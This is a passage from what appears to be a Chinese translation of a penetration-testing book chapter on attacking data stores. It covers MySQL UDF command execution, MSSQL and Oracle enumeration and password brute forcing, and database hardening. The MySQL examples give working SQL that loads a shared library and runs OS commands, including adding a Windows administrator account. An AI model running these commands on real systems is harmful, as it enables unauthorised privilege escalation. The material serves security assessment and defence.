#### 通过MySQL执行本地操作系统命令

如果您能够将一个恶意共享库上传到MySQL可读的目录结构中（通过Web应用程序漏洞、FTP或其他方式），则可以通过MySQL加载该库作为用户定义函数（UDF）来实现操作系统命令执行。Bernardo Damele A. G.的`udfhac` GitHub仓库[^4]包含其共享库的源代码。您可以在`sqlmap`[^5]的`udf/mysql/`目录下找到适用于Windows和Linux的32位和64位编译版本。

示例15-4和15-5演示了该技术，用于从任意位置加载库并在Microsoft Windows和Linux下执行命令，最初由Adam Palmer[^6]描述。

**示例15-4. 通过UDF提升Linux MySQL本地权限**

```sql
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/tmp/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('id > /tmp/out.txt');
```

**示例15-5. 通过UDF提升Windows MySQL本地权限**

```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_files('C://temp//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

## Microsoft SQL Server

运行Microsoft SQL Server的主机通常暴露两个端口：

*   TCP端口1433，客户端用于与服务及数据库交互
*   UDP端口1434，提供解析服务（列出可用实例）

服务器可以使用各种高端口运行多个数据库实例。监听UDP端口1434的SQL Server解析服务（SSRS）提供解析——列出已注册的SQL Server实例及其传输详细信息（例如TCP端口和命名管道[^7]）。

Nmap在遇到SQL Server接口时会调用`ms-sql-info`脚本，如示例15-12所示。该脚本通过UDP端口1434查询SRSS接口并检索可用数据库实例的详细信息。

### 暴力破解密码

Microsoft SQL Server下的默认管理帐户是`sa`。其他有时会创建的帐户包括`distributor_admin`、`sql`、`sqluser`、`sql_account`、`sql_user`和`sql-user`。Hydra和Metasploit[^8]支持通过TCP/IP（默认使用端口1433）进行暴力破解密码。要使用命名管道通过SMB进行暴力破解，可考虑使用`sqlbf`[^9]。

## Oracle数据库

透明网络底层（TNS）协议通过TNS监听器服务代理客户端到Oracle数据库实例的连接，该监听器服务监听TCP端口1521。Nmap对暴露的TNS监听器服务进行指纹识别，如下所示：

```bash
root@kali:~# nmap -sSV -p1521 -n 10.11.21.25
Starting Nmap 6.46 (http://nmap.org) at 2015-08-04 15:39 PDT
Nmap scan report for 10.11.21.25
PORT     STATE SERVICE     VERSION
1521/tcp open  oracle-tns  Oracle TNS Listener 10.2.0.4.0 (for Linux)
```

监听器服务有自己的认证机制，并在数据库之外进行管理。在默认配置下，您可以与TNS监听器交互以检索有用信息，如果未打补丁，还可以利用它拦截数据库流量并远程执行命令。

从网络攻击Oracle数据库实例通常涉及四个步骤：

1.  评估TNS监听器配置并检索有用信息
2.  枚举数据库系统ID（SID）值
3.  掌握有效SID详细信息后，进行暴力破解密码以获取访问权限
4.  认证后，通过可用函数进行权限提升和横向移动

包括TNS监听器在内的组件中存在可利用的缺陷，攻击者可以利用这些缺陷收集数据（例如SID值）并执行任意命令。以下我将详述每个评估阶段以及相应弱点的利用。

## 数据存储对抗措施

在加固数据层组件时，您应考虑以下措施：

*   限制对数据服务的入站和出站网络访问（特别是在云环境中），仅允许授权来源。假设攻击者会破坏凭证，并使用纵深防御来最小化暴露。
*   避免使用不支持认证的存储系统和协议。
*   不要在存储阵列中以未加密状态存储敏感材料（例如通过NFS、iSCSI、SMB和AFP暴露的那些）。系统和数据库的备份文件包含敏感数据，包括密码哈希和凭证。
*   确保服务密码（Microsoft SQL Server中的`sa`帐户、MySQL中的`root`等）足够强且定期更换。
*   仅将管理服务（例如SSH）的暴露限制在可信网络。攻击者可以利用数据库和键值存储中的缺陷将公钥和其他材料写入磁盘，从而通过SSH提供访问。
*   在本地网络可能被入侵的环境中，建立VLAN以限制数据链路（第2层）问题，并考虑传输安全（如IPsec或TLS）以防止窃听和线缆上的数据修改。
*   在数据库中，使用成本高的哈希函数存储密码以防止破解（理想情况下使用基于Blowfish的算法，如Niels Provos和David Mazières的`bcrypt`[^38]或PostgreSQL中的`bf`算法[^39]）。
*   审计并监控认证事件，以识别凭证滥用和暴力破解密码尝试。我无法强调关注这些事件的重要性——攻击者的成功往往会导致严重的数据泄露。
*   数据层的软件维护对于避免数据泄露至关重要。建立季度维护周期，及时给系统打补丁。

Oracle数据库加固建议：

*   审查数据库用户帐户，确保未设置默认凭证。
*   仅将TNS监听器访问限制在可信源（例如应用服务器）。
*   设置TNS监听器密码并通过`lsnrctl`实用程序启用日志记录（使用`SET PASSWORD`和`LOG_STATUS ON`命令）。
*   在`listener.ora`配置文件中使用`ADMIN_RESTRICTIONS`指令禁用运行时TNS监听器配置修改。
*   参考Paul Wright的《Protecting Oracle Database 12c》（Apress, 2014）中的加固建议。

[^38]: Niels Provos and David Mazières, [“A Future-Adaptable Password Scheme”](http://bit.ly/2aTvtlv)，USENIX年度技术会议论文集，加利福尼亚州蒙特雷，1999年6月6-11日。  
[^39]: 参见PostgresSQL文档中的 [“pgcrypto”](http://bit.ly/2aQTzN5)。
